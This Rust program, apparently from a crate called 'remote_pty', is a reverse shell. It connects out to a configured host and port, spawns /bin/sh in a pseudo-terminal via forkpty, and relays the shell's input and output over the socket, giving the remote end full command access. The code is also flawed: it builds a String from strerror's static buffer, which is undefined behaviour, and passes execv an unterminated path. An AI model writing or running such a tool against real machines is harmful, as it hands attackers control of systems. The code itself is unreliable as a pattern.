use chrono::prelude::*;
use libc as c;
use std::io::{Error, ErrorKind};
use std::os::fd::AsRawFd;
use std::{io, ptr};
use tokio::fs::File;
use tokio::io::{AsyncReadExt, AsyncSeekExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::select;

//
#[tokio::main]
async fn main() -> io::Result<()> {
    let (local, port) = remote_pty::args::get_config();
    let local = format!("{}:{}", local, port);

    println!("{:?}: connect to {:?}", Local::now(), &local);

    let mut stream = TcpStream::connect(&local).await?;

    match fork_shell() {
        Ok(fd) => {
            let mut buf = [0u8; 4096 * 5];
            let mut buf1 = [0u8; 4096 * 5];

            //let mut fd = AsyncFd::new(fd).unwrap();
            let mut fd = tokio::fs::File::from_std(fd);
            loop {
                select! {
                    biased;
                    i = fd.read(&mut buf) =>{
                        match i{
                            Ok(n)=>{
                                if n > 0{
                                    //println!("[rd_shell:{:}]{:?}", n, String::from_utf8_lossy(&buf[0..n]));
                                    match stream.write(&mut buf[0..n]).await {
                                        Ok(n)=>{
                                        },
                                        Err(e)=>{eprintln!("write to peer . #{e}");}
                                    }
                                }
                            },
                            Err(e)=>{
                                eprintln!("[read pty err]:{:?}", e);
                                std::process::exit(0);
                            }
                        }
                    }
                    n = stream.read(&mut buf1) =>{
                        match n{
                            Ok(n)=>{
                                 //println!("[shell:{:}]{:?}", n, String::from_utf8_lossy(&buf1[0..n]));

                                let b = &buf1[0..n];
                              //let n = fd.write(b).await;


                            let n = pty_write(fd.as_raw_fd(), b.as_ptr() as * const c::c_void, n).await;
                            match n {
                                Ok(n)=>{

                                        let _ = fd.seek( io::SeekFrom::Start(n as u64)).await;

                                },
                                Err(e)=>{eprintln!("write to shell . #{e}");}
                            }
                            },
                            Err(e)=>{
                                eprintln!("[read stream err]:{:?}", e);
                                std::process::exit(0);
                            }
                        }
                   }
                }
            }
        }
        Err(e) => {
            eprintln!("{:?}", e);
        }
    }
    Ok(())
}

async fn pty_read(fd: c::c_int, buf: *mut c::c_void, count: c::size_t) -> io::Result<usize> {
    unsafe {
        println!("[+] pty_read...");
        let n = c::read(fd, buf, count);
        if n == -1 {
            let i_err = *c::__errno_location();
            if i_err == c::EAGAIN {
                Err(Error::from(ErrorKind::WouldBlock))
            } else {
                let s_err = c::strerror(i_err);
                let s_err = std::ffi::CStr::from_ptr(s_err);
                let s_err = String::from_utf8_lossy(s_err.to_bytes()).to_string();
                Err(Error::new(
                    ErrorKind::Other,
                    format!("[read err]:{}-{}", i_err, s_err),
                ))
            }
        } else if n >= 0 {
            Ok(n as usize)
        } else {
            Err(Error::new(ErrorKind::Other, format!("[read err]:{}", -2)))
        }
    }
}

async fn pty_write(fd: c::c_int, buf: *const c::c_void, count: c::size_t) -> io::Result<usize> {
    unsafe {
        let size = c::write(fd, buf, count);
        if size == -1 {
            let i_err = *c::__errno_location();
            let s_err = c::strerror(i_err);
            let s_err = std::ffi::CStr::from_ptr(s_err);
            let s_err = String::from_utf8_lossy(s_err.to_bytes()).to_string();
            Err(Error::new(
                ErrorKind::Other,
                format!("[write err]:{}-{}", i_err, s_err),
            ))
        } else if size >= 0 {
            Ok(size as usize)
        } else {
            Err(Error::new(ErrorKind::Other, format!("[write err]:{}", -2)))
        }
    }
}
fn fork_shell() -> io::Result<std::fs::File> {
    //let shell_path = get_shell_path()?;
    let shell_path = "/bin/sh".to_string();
    unsafe {
        let mut master_fd = 0;

        let pid = c::forkpty(&mut master_fd, ptr::null_mut(), ptr::null(), ptr::null());
        if pid == -1 {
            let s_err = c::strerror(*c::__errno_location());
            let len = c::strlen(s_err);
            let s_err = String::from_raw_parts(s_err as *mut u8, len, len);

            return Err(Error::new(ErrorKind::Other, format!("forkpty:{}", s_err)));
        } else if pid == 0 {
            // child process
            c::execv(shell_path.as_ptr() as *const c::c_char, ptr::null());
            Err(Error::new(ErrorKind::Other, "ch_exit"))
        } else if pid > 0 {
            // parent process
            use std::os::fd::FromRawFd;
            Ok(std::fs::File::from_raw_fd(master_fd))
        } else {
            Err(Error::new(ErrorKind::UnexpectedEof, "Unknown err!"))
        }
    }
}
